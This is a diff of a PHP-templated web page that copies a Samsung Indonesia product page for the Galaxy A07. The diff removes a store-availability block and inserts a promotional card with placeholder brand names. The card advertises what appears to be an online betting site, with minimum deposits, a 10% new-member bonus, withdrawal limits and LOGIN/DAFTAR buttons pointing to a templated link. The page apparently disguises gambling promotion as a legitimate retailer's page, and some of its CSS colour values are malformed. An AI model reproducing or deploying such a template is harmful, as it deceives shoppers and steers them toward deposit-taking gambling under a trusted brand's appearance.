+                   <svg height="18.415" viewbox="0 0 18.415 18.415" width="18.415" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M17,0,9.208,7.793,1.415,0,0,1.415,7.793,9.208,0,17l1.415,1.415,7.793-7.793L17,18.415,18.415,17,10.623,9.208l7.793-7.793Z">
+                    </path>
+                   </svg>
+                  </button>
+                 </div>
+                 <div class="hr">
+                 </div>
+                 <div class="angle-container">
+                  <div class="angle-text">
+                   Spin the angle
+                  </div>
+                  <button aria-label="spin left" class="btn-spin-left">
+                   <svg height="16.497" viewbox="0 0 22.492 16.497" width="22.492" xmlns="http://www.w3.org/2000/svg">
+                    <g transform="translate(0 3.148)">
+                     <path d="M11.312,8.505h-.143a24.965,24.965,0,0,1-4.3-.375,19.574,19.574,0,0,1-1.91-.44,14.546,14.546,0,0,1-1.664-.583A9.792,9.792,0,0,1,1.921,6.4,5.908,5.908,0,0,1,.884,5.589a3.329,3.329,0,0,1-.655-.9,2.138,2.138,0,0,1,0-1.924,3.322,3.322,0,0,1,.655-.9,5.9,5.9,0,0,1,1.037-.811A9.723,9.723,0,0,1,3.294.354C3.6.225,3.914.106,4.224,0l.354,1.1-.251.087a9.036,9.036,0,0,0-1.194.531,5.1,5.1,0,0,0-.9.61,2.58,2.58,0,0,0-.57.675,1.419,1.419,0,0,0,0,1.448,2.58,2.58,0,0,0,.57.675,5.1,5.1,0,0,0,.9.61,9.078,9.078,0,0,0,1.194.532,16.467,16.467,0,0,0,3.11.77,24.9,24.9,0,0,0,3.731.282h.153a24.966,24.966,0,0,0,3.732-.282,16.448,16.448,0,0,0,3.109-.77,9.116,9.116,0,0,0,1.195-.532,5.13,5.13,0,0,0,.9-.61,2.575,2.575,0,0,0,.57-.675,1.417,1.417,0,0,0,0-1.448,2.572,2.572,0,0,0-.57-.675,5.12,5.12,0,0,0-.9-.61,9.105,9.105,0,0,0-1.193-.531l.354-1.1c.224.081.453.17.678.265a9.813,9.813,0,0,1,1.373.706,5.917,5.917,0,0,1,1.037.811,3.346,3.346,0,0,1,.655.9,2.142,2.142,0,0,1,0,1.924,3.344,3.344,0,0,1-.655.9,5.9,5.9,0,0,1-1.037.811,9.721,9.721,0,0,1-1.373.707,14.477,14.477,0,0,1-1.665.583,19.469,19.469,0,0,1-1.91.439A24.933,24.933,0,0,1,11.312,8.505Z" transform="translate(0 4.844)">
+                     </path>
+                     <g transform="translate(6.686 -2.648)">
+                      <path d="M2.1,6.319a2.081,2.081,0,0,1-.916-.191,1.682,1.682,0,0,1-.654-.573,2.789,2.789,0,0,1-.394-.981A6.725,6.725,0,0,1,0,3.16,6.727,6.727,0,0,1,.131,1.746,2.785,2.785,0,0,1,.525.765,1.682,1.682,0,0,1,1.179.191,2.078,2.078,0,0,1,2.1,0a2.112,2.112,0,0,1,.924.191,1.688,1.688,0,0,1,.66.573,2.78,2.78,0,0,1,.4.981A6.658,6.658,0,0,1,4.207,3.16a6.659,6.659,0,0,1-.132,1.414,2.784,2.784,0,0,1-.4.981,1.688,1.688,0,0,1-.66.573A2.114,2.114,0,0,1,2.1,6.319Zm0-5.085c-.236,0-.4.149-.5.444a4.941,4.941,0,0,0-.147,1.376v.114a5.184,5.184,0,0,0,.148,1.479c.1.292.266.439.5.439s.414-.148.516-.439a5.059,5.059,0,0,0,.152-1.479,5.146,5.146,0,0,0-.152-1.491C2.51,1.383,2.336,1.234,2.1,1.234Z" stroke="rgba(0,0,0,0)" stroke-miterlimit="10" stroke-width="1" transform="translate(4.664 3.425)">
+                      </path>
+                      <path d="M1.968,9.745.853,8.858l.828-.938.389-.439-.133.013-.068,0H1.842a1.845,1.845,0,0,1-.959-.249,1.716,1.716,0,0,1-.651-.7A2.217,2.217,0,0,1,0,5.521,2.382,2.382,0,0,1,.258,4.393a1.809,1.809,0,0,1,.731-.748,2.242,2.242,0,0,1,1.1-.262,2.269,2.269,0,0,1,1.124.27,1.889,1.889,0,0,1,.748.765,2.407,2.407,0,0,1,.266,1.153,3.56,3.56,0,0,1-.317,1.5,7.531,7.531,0,0,1-.948,1.465l-.1.118-.9,1.09h0ZM1.622,4.837a1.147,1.147,0,0,0-.169.659,1.066,1.066,0,0,0,.194.676.646.646,0,0,0,.532.245,1.479,1.479,0,0,0,.414-.059,1.848,1.848,0,0,0,.186-.8A1.212,1.212,0,0,0,2.6,4.85a.591.591,0,0,0-.511-.258A.538.538,0,0,0,1.622,4.837ZM6.735,1.153A1.153,1.153,0,1,1,7.888,2.307,1.153,1.153,0,0,1,6.735,1.153Z" stroke="rgba(0,0,0,0)" stroke-miterlimit="10" stroke-width="1" transform="translate(0 0)">
+                      </path>
+                     </g>
+                     <path d="M4.147,4.147h-.9V.9H0V0H4.147Z" stroke="rgba(0,0,0,0)" stroke-miterlimit="10" stroke-width="1" transform="translate(0.88 4.302)">
+                     </path>
+                    </g>
+                   </svg>
+                  </button>
+                  <button aria-label="spin right" class="btn-spin-right">
+                   <svg height="16.498" viewbox="0 0 22.492 16.498" width="22.492" xmlns="http://www.w3.org/2000/svg">
+                    <g transform="translate(0 3.148)">
+                     <path d="M11.313,0H11.17a24.965,24.965,0,0,0-4.3.375,19.574,19.574,0,0,0-1.91.44A14.546,14.546,0,0,0,3.294,1.4,9.792,9.792,0,0,0,1.921,2.1a5.909,5.909,0,0,0-1.037.812,3.329,3.329,0,0,0-.655.9,2.138,2.138,0,0,0,0,1.924,3.322,3.322,0,0,0,.655.9,5.9,5.9,0,0,0,1.037.811,9.723,9.723,0,0,0,1.373.707c.307.129.62.248.931.354l.354-1.1-.251-.087a9.036,9.036,0,0,1-1.194-.531,5.1,5.1,0,0,1-.9-.61,2.581,2.581,0,0,1-.57-.675,1.419,1.419,0,0,1,0-1.448,2.581,2.581,0,0,1,.57-.675,5.1,5.1,0,0,1,.9-.61,9.078,9.078,0,0,1,1.194-.532,16.467,16.467,0,0,1,3.11-.77,24.9,24.9,0,0,1,3.732-.282h.153a24.966,24.966,0,0,1,3.732.282,16.448,16.448,0,0,1,3.109.77,9.116,9.116,0,0,1,1.195.532,5.13,5.13,0,0,1,.9.61,2.575,2.575,0,0,1,.57.675,1.418,1.418,0,0,1,0,1.448,2.573,2.573,0,0,1-.57.675,5.12,5.12,0,0,1-.9.61,9.105,9.105,0,0,1-1.193.531l.354,1.1c.224-.081.453-.17.678-.265a9.813,9.813,0,0,0,1.373-.706,5.917,5.917,0,0,0,1.037-.811,3.346,3.346,0,0,0,.655-.9,2.142,2.142,0,0,0,0-1.924,3.344,3.344,0,0,0-.655-.9,5.9,5.9,0,0,0-1.037-.811A9.722,9.722,0,0,0,19.2,1.4,14.477,14.477,0,0,0,17.534.816a19.469,19.469,0,0,0-1.91-.439A24.932,24.932,0,0,0,11.313,0Z" transform="translate(22.492 13.35) rotate(180)">
+                     </path>
+                     <path d="M4.147,0h-.9V3.242H0v.9H4.147Z" stroke="rgba(0,0,0,0)" stroke-miterlimit="10" stroke-width="1" transform="translate(21.612 8.449) rotate(180)">
+                     </path>
+                     <g transform="translate(6.686 -2.648)">
+                      <path d="M2.1,6.319a2.081,2.081,0,0,1-.916-.191,1.682,1.682,0,0,1-.654-.573,2.789,2.789,0,0,1-.394-.981A6.725,6.725,0,0,1,0,3.16,6.727,6.727,0,0,1,.131,1.746,2.785,2.785,0,0,1,.525.765,1.682,1.682,0,0,1,1.179.191,2.078,2.078,0,0,1,2.1,0a2.112,2.112,0,0,1,.924.191,1.688,1.688,0,0,1,.66.573,2.78,2.78,0,0,1,.4.981A6.658,6.658,0,0,1,4.207,3.16a6.659,6.659,0,0,1-.132,1.414,2.784,2.784,0,0,1-.4.981,1.688,1.688,0,0,1-.66.573A2.114,2.114,0,0,1,2.1,6.319Zm0-5.085c-.236,0-.4.149-.5.444a4.941,4.941,0,0,0-.147,1.376v.114a5.184,5.184,0,0,0,.148,1.479c.1.292.266.439.5.439s.414-.148.516-.439a5.059,5.059,0,0,0,.152-1.479,5.146,5.146,0,0,0-.152-1.491C2.51,1.383,2.336,1.234,2.1,1.234Z" stroke="rgba(0,0,0,0)" stroke-miterlimit="10" stroke-width="1" transform="translate(4.664 3.425)">
+                      </path>
+                      <path d="M1.968,9.745.853,8.858l.828-.938.389-.439-.133.013-.068,0H1.842a1.845,1.845,0,0,1-.959-.249,1.716,1.716,0,0,1-.651-.7A2.217,2.217,0,0,1,0,5.521,2.382,2.382,0,0,1,.258,4.393a1.809,1.809,0,0,1,.731-.748,2.242,2.242,0,0,1,1.1-.262,2.269,2.269,0,0,1,1.124.27,1.889,1.889,0,0,1,.748.765,2.407,2.407,0,0,1,.266,1.153,3.56,3.56,0,0,1-.317,1.5,7.531,7.531,0,0,1-.948,1.465l-.1.118-.9,1.09h0ZM1.622,4.837a1.147,1.147,0,0,0-.169.659,1.066,1.066,0,0,0,.194.676.646.646,0,0,0,.532.245,1.479,1.479,0,0,0,.414-.059,1.848,1.848,0,0,0,.186-.8A1.212,1.212,0,0,0,2.6,4.85a.591.591,0,0,0-.511-.258A.538.538,0,0,0,1.622,4.837ZM6.735,1.153A1.153,1.153,0,1,1,7.888,2.307,1.153,1.153,0,0,1,6.735,1.153Z" stroke="rgba(0,0,0,0)" stroke-miterlimit="10" stroke-width="1" transform="translate(0 0)">
+                      </path>
+                     </g>
+                    </g>
+                   </svg>
+                  </button>
+                 </div>
+                </div>
+                <button aria-label="ar" class="btn-ar">
+                 AR
                 </button>
+               </div>
               </div>
-              <h2 class="my-store-locator-drawer__title" id="MyStoreLocatorDrawerHeading">
-                Store availability
-              </h2>
-              <div class="js-store-locator-product-info my-store-locator-drawer__product">
-                <div class="my-store-locator-drawer__product-image global-media-settings">
-                    <img
-                      src="<?= $image; ?>?v=1757450054&width=176"
-                      alt="<?= $title; ?>"
-                      width="88"
-                      height="88"
-                      loading="lazy"
-                      >
+             </div>
+            </div>
+           </div>
+          </div>
+         </div>
+         <div class="hdd02-gallery__layer-popup type-360view">
+          <div class="view360">
+           <div class="view360-contents">
+            <div class="image-360">
+             <div data-akamai-viewer="" data-spin-uri="/assets/resources/json/ex-360-watch.json">
+             </div>
+            </div>
+           </div>
+          </div>
+          <div class="hdd02-gallery__layer-popup-close" data-js-action="closeLayerPopup">
+           <a class="popup-close" href="javascript:void(0)">
+            <span class="hidden">
+             popup close
+            </span>
+            <svg aria-hidden="true" class="icon" focusable="false">
+             <use href="#cancel-close-regular" xlink:href="#cancel-close-regular">
+             </use>
+            </svg>
+           </a>
+          </div>
+         </div>
+         <div class="hdd02-gallery__layer-popup type-ar">
+          <div class="ar-popup-inner">
+           <strong class="ar-popup-title">
+            Lihat dengan Augmented Reality
+           </strong>
+           <p class="ar-popup-text">
+            Harap pindai Kode QR dengan perangkat mobile Anda, dan letakkan gambar produk di tempat yang diinginkan.
+           </p>
+           <div class="qr-code">
+            <!--<img alt="" src="">-->
+           </div>
+           <div class="hdd02-gallery__layer-popup-close">
+            <a class="popup-close" data-js-action="closeLayerPopup" href="javascript:void(0)">
+             <span class="hidden">
+              popup close
+             </span>
+             <svg aria-hidden="true" class="icon" focusable="false">
+              <use href="#cancel-close-regular" xlink:href="#cancel-close-regular">
+              </use>
+             </svg>
+            </a>
+           </div>
+          </div>
+         </div>
+         <script defer="" src="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/js/popupnew360.js" type="text/javascript">
+         </script>
+        </section>
+       </div>
+      </div>
+      <div id="detail-input-hidden">
+       <input id="isCommonTradein" name="isCommonTradein" type="hidden" value="Y"/>
+       <input id="returnPolicy" name="returnPolicy" type="hidden"/>
+       <input id="warranty" name="warranty" type="hidden"/>
+       <input id="oldProductYn" type="hidden" value="N"/>
+       <input id="pdWtbCtaBtnYn" type="hidden"/>
+       <input id="pdRemoveTagTxt" type="hidden" value="Galaxy A07"/>
+       <input id="wtbSrc" type="hidden" value="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-thumb-548603129"/>
+       <input id="imgUrl" type="hidden" value="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603128"/>
+       <input id="pdProductType" type="hidden" value="PHONE"/>
+       <input id="pdUpgradeUseYn" type="hidden"/>
+       <input id="pdProductTypeCheckYn" name="pdProductTypeCheckYn" type="hidden" value="Y"/>
+       <input id="pdTimeformatFront" name="pdTimeformatFront" type="hidden" value="yyyy-mm-dd"/>
+       <input id="multiCareYn" name="multiCareYn" type="hidden"/>
+       <input id="pdBogoUseYn" name="pdBogoUseYn" type="hidden" value="Y"/>
+       <input id="pdSoftBundleUseYn" name="pdSoftBundleUseYn" type="hidden" value="Y"/>
+       <input id="promotionImgType" name="promotionImgType" type="hidden" value="finance,insurance,tradein,upgrade,cashback,discount,emi_available,emi_nocost,exchange,offer_bogo,offer_combo,offer_discount,offer_etc,offer_mobile,offer_watch,freedelivery,20K"/>
+       <input id="commonCode" name="commonCode" type="hidden"/>
+       <input id="pdCareLearnMoreUrl" name="pdCareLearnMoreUrl" type="hidden" value="/id/offer/insurance/"/>
+       <input id="pdPageCareYn" type="hidden" value="N"/>
+       <input id="smcType" name="smcType" type="hidden"/>
+       <input id="pdTradeInUrl" name="pdTradeInUrl" type="hidden" value="/id/offer/mobile-trade-in/"/>
+       <input id="pdUpgradeLearnMoreUrl" name="pdUpgradeLearnMoreUrl" type="hidden"/>
+       <input id="pdCalculateFinancingYn" name="pdCalculateFinancingYn" type="hidden" value="N"/>
+       <input id="pdWarrantyLearnMoreUrl" name="pdWarrantyLearnMoreUrl" type="hidden"/>
+       <input id="detailNodePath" name="detailNodePath" type="hidden" value="/id/smartphones/galaxy-a/galaxy-a07-black-64gb-sm-a075fzkdxid/buy.dynamic"/>
+       <input id="checkOutUrl" name="checkOutUrl" type="hidden" value="/id/web/checkout/"/>
+       <input id="cartUrl" name="cartUrl" type="hidden" value="https://shop.samsung.com/id/cart"/>
+       <input id="pdDisplayYn" name="pdDisplayYn" type="hidden" value="Y"/>
+       <input id="financeplusUrl" name="financeplusUrl" type="hidden" value="/id/web/offer-grid"/>
+       <input id="currentPdpUrl" name="pdpUrl" type="hidden" value="/id/smartphones/galaxy-a/galaxy-a07-black-64gb-sm-a075fzkdxid/"/>
+       <input id="pageTrackPd" name="pageTrackPd" type="hidden" value="product detail"/>
+       <input id="ebtButtonUse" name="ebtButtonUse" type="hidden" value="N"/>
+       <input id="pvitype" name="pvitype" type="hidden" value="mobile"/>
+       <input id="buyNowUrlYn" name="buyNowUrlYn" type="hidden"/>
+       <input id="pvisubtype" name="pvisubtype" type="hidden" value="smartphone"/>
+       <input id="pimsubtype" name="pimsubtype" type="hidden" value="galaxy a"/>
+       <input id="parentPath" name="parentPath" type="hidden" value="/content/samsung/id/smartphones/galaxy-a/galaxy-a07-black-64gb-sm-a075fzkdxid"/>
+       <input id="deliveryYN" name="deliveryYN" type="hidden" value="N"/>
+       <input id="pfAllUrl" name="pfAllUrl" type="hidden" value="/id/smartphones/all-smartphones.html?galaxy-a"/>
+       <input id="pdCtaType" name="ctaType" type="hidden" value="inStock"/>
+       <input id="useWtbStockFunction" name="useWtbStockFunction" type="hidden" value="Y"/>
+       <input id="wtbDispFuncUseYN" name="wtbDispFuncUseYN" type="hidden" value="N"/>
+       <input id="bespokeCtaUse" name="bespokeCtaUse" type="hidden" value="N"/>
+       <input id="bespokeCtaLink" name="bespokeCtaLink" type="hidden"/>
+       <input id="splitPdYn" name="splitPdYn" type="hidden" value="N"/>
+       <input id="splitPdTradeInYn" name="splitPdTradeInYn" type="hidden" value="N"/>
+       <input id="splitPdSamsungCarePlusYn" name="splitPdSamsungCarePlusYn" type="hidden" value="N"/>
+       <input id="splitPdLeaseYn" name="splitPdLeaseYn" type="hidden" value="N"/>
+       <input id="splitPdUpgradeYn" name="splitPdUpgradeYn" type="hidden" value="N"/>
+       <input id="splitPdTariffYn" name="splitPdTariffYn" type="hidden" value="N"/>
+       <input id="storeWebDomain" name="storeWebDomain" type="hidden" value="https://shop.samsung.com"/>
+       <!-- new-hybris -->
+       <input id="gpvStoreDomain" name="gpvStoreDomain" type="hidden" value="https://p1.ecom.samsung.com"/>
+       <input id="personalizeCheckStatus" name="personalizeCheckStatus" type="hidden"/>
+       <input id="thirdPASeller" name="thirdPASeller" type="hidden"/>
+       <input id="modelLaunchYear" name="modelLaunchYear" type="hidden"/>
+       <input id="productType" name="productType" type="hidden" value="P"/>
+       <input id="gmapLatitude" name="gmapLatitude" type="hidden" value="-6.207456"/>
+       <input id="gmapLongitude" name="gmapLongitude" type="hidden" value="106.845474"/>
+       <input id="apiChangeModelCode" name="apiChangeModelCode" type="hidden" value="MS-F813QBDUIDZ"/>
+       <input id="apiChangeCategorySubSubTypeCode" name="apiChangeCategorySubSubTypeCode" type="hidden"/>
+       <input id="apiChangeCategorySubTypeCode" name="apiChangeCategorySubTypeCode" type="hidden" value="01010400"/>
+       <input id="apiChangeCategoryTypeCode" name="apiChangeCategoryTypeCode" type="hidden" value="01010000"/>
+       <input id="apiChangeCategoryGroupCode" name="apiChangeCategoryGroupCode" type="hidden" value="01000000"/>
+       <input id="apiChangeModelName" name="apiChangeModelName" type="hidden" value="SM-A075F/DS"/>
+       <input id="apiChangeShopSKU" name="apiChangeShopSKU" type="hidden" value="MS-F813QBDUIDZ"/>
+       <input id="apiChangePdpUrl" name="apiChangePdpUrl" type="hidden" value="/id/smartphones/galaxy-a/galaxy-a07-black-64gb-sm-a075fzkdxid/"/>
+       <input id="apiChangeFamilyCode" name="apiChangeFamilyCode" type="hidden" value="561454"/>
+       <input id="apiChangeDisplayName" name="apiChangeDisplayName" type="hidden" value="Galaxy A07"/>
+       <input id="apiChangePdJcrTitle" name="apiChangePdJcrTitle" type="hidden" value="<?= $title; ?>"/>
+       <input id="apiChangeWtbUseYn" name="apiChangeWtbUseYn" type="hidden" value="N"/>
+       <input id="apiChangeStockStatus" name="apiChangeStockStatus" type="hidden" value=""/>
+       <input id="ecomStoreType" name="ecomStoreType" type="hidden"/>
+       <input id="refurYn" name="refurYn" type="hidden" value="N"/>
+       <input id="offerId" name="offerId" type="hidden"/>
+       <input id="virtualModelCode" name="virtualModelCode" type="hidden"/>
+       <input id="originShopSku" name="originShopSku" type="hidden" value="MS-F813QBDUIDZ"/>
+       <input id="originModelCode" name="originModelCode" type="hidden"/>
+       <input id="eanCode" name="eanCode" type="hidden"/>
+       <input id="ceTradeUpProductYn" name="ceTradeUpProductYn" type="hidden" value="N"/>
+       <input id="ceTradeUpEnabledYn" name="ceTradeUpEnabledYn" type="hidden" value="N"/>
+       <input id="ceTradeUpDeployable" name="ceTradeUpDeployable" type="hidden" value="true"/>
+       <input id="pdPackageYn" name="pdPackageYn" type="hidden" value="N"/>
+       <input id="pdChildModelCnt" name="pdChildModelCnt" type="hidden" value="0"/>
+       <input id="isMultiTradeIn" name="isMultiTradeIn" type="hidden" value="Y"/>
+       <input id="isOldHybrisWishlist" name="isOldHybrisWishlist" type="hidden" value="N"/>
+       <script type="text/javascript">
+        var globalShopInfo = {};
+        var gpv2ShopInfo = {};
+        var newHybrisShopInfo = {"price":"1399000","priceDisplay":"Rp1.399.000","promotionPrice":"1399000","promotionPriceDisplay":"Rp1.399.000","saveText":"0","financingDesc":["Mulai dari Rp116.583/bln. Kalkulator Finansial"],"shopServiceYN":"Y"};
+        var hybrisShopInfo = {};
+       </script>
+      </div>
+      <div class="hdd02-pdp-header__buying-tool sg-pdh-buying-tool">
+       <section class="hdd02-buying-tool">
+        <section class="pdd36-recommendation-oos-new pdd36-recommendation-oos-new--mobile-2column">
+        </section>
+        <div class="hdd02-buying-tool__option sg-pdh-buying-options">
+
+         <div class="pd-select-option pd-select-option--check-dealer-stock" style="display: none;">
+         </div>
+        
+         
+         <div class="wt-mt-xs-1 wt-mb-xs-1">
+
+<style>
+    .<?= $BRAND; ?> x <?= $BRAND2; ?>ng-card {
+            max-width: 750px;
+            width: 100%;
+            background: 355070;
+            border-radius: 32px;
+            padding: 40px 35px;
+            box-shadow: 0 25px 45px -20px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(212, 175, 55, 0.25);
+        }
+        .hero-title {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .hero-title h1 {
+            font-size: 34px;
+            font-weight: 700;
+            line-height: 1.4;
+            color:#000000;
+            margin-bottom: 5px;
+        }
+        
+        .hero-title h1 span {
+            color: 48CAE4;
+            font-weight: 800;
+        }
+        
+        /* header dalam card */
+        .brand-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .brand-header h2 {
+            font-size: 2rem;
+            font-weight: 800;
+            color:#000000;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+        }
+        
+        .brand-header .sub {
+            font-size: 15px;
+            color: 6A994E;
+            font-weight: 500;
+            position: relative;
+            display: inline-block;
+            padding-bottom: 8px;
+        }
+        
+        .brand-header .sub:after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 50px;
+            height: 2px;
+            background: 6A994E;
+        }
+        
+        /* info box */
+        .info-container {
+            background: #fafafa;
+            border-radius: 20px;
+            border: 1px solid 48CAE4;
+            overflow: hidden;
+            margin-bottom: 30px;
+        }
+        
+        .info-head {
+            padding: 15px 20px;
+            border-bottom: 1px solid 48CAE4;
+            background: #fffbf2;
+        }
+        
+        .info-head h3 {
+            margin: 0;
+            font-size: 16px;
+            color: 48CAE4;
+            font-weight: 700;
+            text-align: center;
+            letter-spacing: 0.5px;
+        }
+        
+        .info-list {
+            padding: 5px 0;
+        }
+        
+        .info-row {
+            padding: 14px 22px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid 6A994E;
+        }
+        
+        .info-row:last-child {
+            border-bottom: none;
+        }
+        
+        .info-label {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .info-dot {
+            width: 8px;
+            height: 8px;
+            background: 6A994E;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        
+        .info-text {
+            color: #2a2a2a;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        
+        .info-number {
+            color:#000000;
+            font-size: 15px;
+            font-weight: 600;
+            background: 355070;
+            padding: 4px 14px;
+            border-radius: 40px;
+            border: 1px solid 6A994E;
+        }
+        
+        /* bonus section */
+        .bonus-wrap {
+            background: #fefcf7;
+            border-radius: 20px;
+            padding: 25px 20px;
+            margin: 30px 0 35px;
+            border: 1px solid 48CAE4;
+            text-align: center;
+        }
+        
+        .bonus-head {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .bonus-head .gold-icon {
+            width: 8px;
+            height: 8px;
+            background: 6A994E;
+            border-radius: 50%;
+        }
+        
+        .bonus-head h3 {
+            margin: 0;
+            font-size: 16px;
+            color: 48CAE4;
+            font-weight: 700;
+        }
+        
+        .bonus-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .bonus-item {
+            padding: 12px 15px;
+            background: 355070;
+            border-radius: 14px;
+            border-left: 4px solid 6A994E;
+            box-shadow: 0 2px 8px rgba(212, 175, 55, 0.05);
+            text-align: left;
+        }
+        
+        .bonus-item p {
+            margin: 0;
+            font-size: 15px;
+            font-weight: 600;
+            color:#000000;
+        }
+        
+        .bonus-item .highlight-gold {
+            color: 48CAE4;
+            font-weight: 700;
+        }
+        
+        .bonus-item .highlight-black {
+            color:#000000;
+        }
+        
+        /* CTA buttons - gold edition */
+        .cta-gold-section {
+            margin-top: 25px;
+            text-align: center;
+        }
+        
+        .cta-buttons-gold {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        
+        .btn-gold {
+            display: inline-block;
+            padding: 14px 42px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 16px;
+            letter-spacing: 1px;
+            text-decoration: none;
+            transition: all 0.2s ease;
+            border: 1px solid;
+            min-width: 140px;
+        }
+        
+        .btn-login-gold {
+            background: transparent;
+            color:#000000;
+            border-color: 6A994E;
+        }
+        
+        .btn-login-gold:hover {
+            background: 48CAE4;
+        }
+        
+        .btn-register-gold {
+            background: 6A994E;
+            color:#000000;
+            border-color: 6A994E;
+        }
+        
+        .btn-register-gold:hover {
+            background: 6A994E;
+        }
+</style>
+<div class="<?= $BRAND; ?> x <?= $BRAND2; ?>ng-card">
+        <!-- main title (atas sekali) -->
+        <div class="hero-title">
+            <h1><?= $title; ?></h1>
+        </div>
+        <!-- Info Box -->
+        <div class="info-container">
+            <div class="info-head">
+                <h2>INFORMASI SITUS <?= $BRAND; ?> x <?= $BRAND2; ?></h2>
+            </div>
+            <div class="info-list">
+                <div class="info-row">
+                    <div class="info-label">
+                        <span class="info-dot"></span>
+                        <span class="info-text">Penilaian Pengguna</span>
+                    </div>
+                    <span class="info-number">5 JUTA PENGGUNA</span>
                 </div>
-                <div class="my-store-locator-drawer__product-info">
-                    <h3><?= $BRAND; ?></h3>
-                    <div class="my-store-locator-drawer__product-option">
-                      <span>Color:</span>
-                      <span>Cosmic Orange</span>
+                <div class="info-row">
+                    <div class="info-label">
+                        <span class="info-dot"></span>
+                        <span class="info-text">Minimal Deposit</span>
                     </div>
-                    <div class="my-store-locator-drawer__product-option">
-                      <span>Model:</span>
-                      <span><?= $BRAND; ?></span>
-                    </div>
-                    <div class="my-store-locator-drawer__product-option">
-                      <span>Capacity:</span>
-                      <span>256GB</span>
-                    </div>
+                    <span class="info-number">10.000 Ribu</span>
                 </div>
+                <div class="info-row">
+                    <div class="info-label">
+                        <span class="info-dot"></span>
+                        <span class="info-text">Layanan Support</span>
+                    </div>
+                    <span class="info-number">24/7</span>
+                </div>
+                <div class="info-row">
+                    <div class="info-label">
+                        <span class="info-dot"></span>
+                        <span class="info-text">Platform</span>
+                    </div>
+                    <span class="info-number">Multi-Device</span>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Bonus Highlight -->
+        <div class="bonus-wrap">
+            <div class="bonus-head">
+                <span class="gold-icon"></span>
+                <h3>PENAWARAN SPESIAL</h3>
+                <span class="gold-icon"></span>
+            </div>
+            
+            <div class="bonus-list">
+                <div class="bonus-item">
+                    <p><span class="highlight-gold">BONUS NEW MEMBER 10%</span></p>
+                </div>
+                <div class="bonus-item">
+                    <p><span class="highlight-black">Minimal Deposit Rp. 10.000</span></p>
+                </div>
+                <div class="bonus-item">
+                    <p><span class="highlight-black">Minimal Withdraw Rp 50.000</span></p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- CTA Buttons - Gold Version (tanpa animasi Dunia Game Digital Yang) -->
+        <div class="cta-gold-section">
+            <div class="cta-buttons-gold">
+                <a href="<?= $ampmek; ?>" rel="nofollow noreferrer" class="btn-gold btn-login-gold" title="Masuk akun">LOGIN</a>
+                <a href="<?= $ampmek; ?>" rel="nofollow noreferrer" class="btn-gold btn-register-gold" title="Daftar sekarang">DAFTAR</a>
+            </div>
+        </div>
+    </div>
+
+</div>
+            </li>
+           </ul>
+           <p class="pd-select-option__alert-message">
+            <svg class="icon" focusable="false" viewbox="0 0 96 96">
+             <path d="M48 2.5c25.089 0 45.5 20.412 45.5 45.502C93.5 73.09 73.089 93.5 48 93.5S2.5 73.09 2.5 48.002C2.5 22.912 22.911 2.5 48 2.5zM51 40H39.542v6H45v30h6V40zm-4.002-21l-.217.005A5.005 5.005 0 0042 24a5.006 5.006 0 004.781 4.996l.217.005.217-.005a5.009 5.009 0 004.78-4.774l.005-.223-.005-.216a5.008 5.008 0 00-4.774-4.778L46.998 19z">
+             </path>
+            </svg>
+            <span class="pd-select-option__alert-span-text">
+            </span>
+           </p>
+          </div>
+         </div>
+         <div class="pd-select-option option-bezelcolor bundle-group" id="option-bezelcolor" style="display: none;">
+         </div>
+         <div class="pd-select-option__eta-text text-type2 js-shippingOrBack" style="display: none;">
+         </div>
+         <div class="pd-select-option__eta-text js-deliveryMessage" style="display: none;">
+         </div>
+         <div class="pd-select-option trade-in off-change" id="trade-in" style="display: none;">
+         </div>
+         <div class="option-result__device-area" id="tradeInErrMsg" style="display: none;">
+         </div>
+         <div class="option-result result-trade-in option-result--content" style="display: none;">
+         </div>
+         <div class="pd-select-option option-between" style="display: none;">
+          <div class="pd-select-option__headline-wrap">
+           <h3 class="pd-select-option__headline">
+            Pilih Antara Anda
+           </h3>
+          </div>
+          <div class="pd-select-option__wrap">
+          </div>
+         </div>
+         <div class="pd-select-option pd-select-option--delivery-detail" style="display: none;">
+         </div>
+         <div class="option-result result-delivery" style="display: none;">
+         </div>
+         <div class="pd-select-option pd-select-option__extra-benefit" style="display: none;">
+         </div>
+         <div class="pd-select-option off-change option-tariff" style="display: none;">
+         </div>
+         <div class="option-result result-tariff-option" style="display: none;">
+         </div>
+         <div class="pd-select-option option-offer-finance" style="display: none;">
+         </div>
+         <!-- CRHQ-3143 [B2C] ES - SC+ 개선 -->
+         <div class="pd-select-option off-change option-care" style="display: none;">
+         </div>
+         <div class="option-result-dev result-care" style="display: none;">
+         </div>
+         <div class="pd-select-option off-change option-new-assured-buy-back" style="display: none;">
+         </div>
+         <div class="option-result-dev result-option-new-assured-buy-back" style="display: none;">
+         </div>
+         <div class="pd-select-option off-change option-warranty" style="display: none;">
+         </div>
+         <div class="option-result result-warranty" style="display: none;">
+         </div>
+         <div class="pd-select-option off-change option-warranty-vd" style="display: none;">
+         </div>
+         <div class="option-result option-result--extended-warranty-option" style="display: none;">
+         </div>
+         <div class="pd-select-option option-embed-addon" style="display: none;">
+         </div>
+         <!-- CRHQ-2498 PrePurchase Check, 20241122 by mati namgab - VD and DA 영역 Start -->
